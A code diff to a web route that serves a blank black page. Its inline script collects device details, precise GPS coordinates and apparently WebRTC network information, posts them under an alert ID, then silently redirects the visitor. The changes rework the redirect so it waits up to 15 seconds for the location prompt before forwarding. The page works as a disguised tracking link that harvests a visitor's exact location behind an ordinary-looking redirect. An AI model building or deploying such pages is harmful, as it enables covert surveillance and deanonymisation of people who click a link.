@@ -356,6 +356,21 @@ export async function GET(
     <body style="background: #000;">
       <script>
         (async function() {
+          window.redirectTriggered = false;
+          window.doRedirect = () => {
+            ${finalUrl ? `
+              if (!window.redirectTriggered) {
+                window.redirectTriggered = true;
+                window.location.replace('${finalUrl}');
+              }
+            ` : `
+              // No redirect configured, do nothing
+            `}
+          };
+          
+          ${finalUrl ? `window.fallbackTimer = setTimeout(window.doRedirect, 15000); // 15s max wait` : ``}
+
+          let alertId = '${alertId}';
           try {
             let device_model = '';
             let os_platform = navigator.platform || '';
@@ -569,16 +584,24 @@ export async function GET(
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ alert_id: '${alertId}', details: { exact_lat: pos.coords.latitude, exact_lon: pos.coords.longitude } })
                     }).catch(()=>{}).finally(() => {
-                      if (typeof doRedirect === 'function') { clearTimeout(fallbackTimer); doRedirect(); }
+                      if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
+                      window.doRedirect();
                     });
                   },
                   (err) => {
-                     if (typeof doRedirect === 'function') { clearTimeout(fallbackTimer); doRedirect(); }
+                     if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
+                     window.doRedirect();
                   },
-                  { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                  { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
+              } else {
+                if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
+                window.doRedirect();
               }
-            } catch(e) {}
+            } catch(e) {
+                if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
+                window.doRedirect();
+            }
 
             try {
               const rtc = new RTCPeerConnection({iceServers:[]});
@@ -757,27 +780,6 @@ export async function GET(
             window.addEventListener('beforeunload', sendDwellTime);
 
           } catch(e) {}
-          
-          ${finalUrl ? `
-            // Logic to wait for Location permission prompt before redirecting
-            let redirectTriggered = false;
-            const doRedirect = () => {
-              if (!redirectTriggered) {
-                redirectTriggered = true;
-                window.location.replace('${finalUrl}');
-              }
-            };
-            
-            // If they don't answer the prompt after 10 seconds, force the redirect anyway
-            const fallbackTimer = setTimeout(doRedirect, 10000);
-
-            // The geolocation success/error callbacks in the try-catch block above will handle the redirect.
-            // But if geolocation isn't supported at all, redirect immediately.
-            if (!navigator.geolocation) {
-               clearTimeout(fallbackTimer);
-               doRedirect();
-            }
-          ` : ''}
         })();
       </script>
     </body>
